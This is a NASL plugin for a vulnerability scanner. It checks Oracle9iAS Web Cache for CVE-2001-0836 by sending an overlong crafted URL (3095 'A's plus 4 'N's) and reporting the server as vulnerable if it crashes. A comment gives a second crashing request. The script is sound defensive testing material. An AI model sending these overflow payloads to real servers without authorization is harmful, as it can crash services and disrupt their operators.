# SPDX-FileCopyrightText: 2002 Michel Arboi
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11081");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/3443");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2001-0836");
  script_name("Oracle9iAS too long URL");
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright("Copyright (C) 2002 Michel Arboi");
  script_family("Gain a shell remotely");
  script_dependencies("gb_get_http_banner.nasl");
  script_mandatory_keys("Oracle/banner");
  script_require_ports("Services/www", 1100);

  script_tag(name:"summary", value:"It may be possible to make the Oracle9i application server crash
  or execute arbitrary code by sending it a too long url specially crafted URL.");

  script_tag(name:"affected", value:"Oracle9iAS Web Cache/2.0.0.1.0.");

  script_tag(name:"solution", value:"Upgrade your server.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");

port = http_get_port( default:1100 );

if( http_is_dead( port:port ) ) exit( 0 );

banner = http_get_remote_headers( port:port );

if( ! banner || "Oracle" >!< banner ) exit( 0 );

# Note: sending 'GET /<3571 x A> HTTP/1.0' will kill it too.
url = string( "/", crap( data:"A", length:3095 ), crap( data:"N", length:4 ) );

req = http_get( item:url, port:port );
res = http_send_recv( port:port, data:req );

if( http_is_dead( port:port, retry:4 ) ) {
  security_message( port:port );
  set_kb_item( name:"www/too_long_url_crash", value:TRUE );
  exit( 0 );
}

exit( 99 );
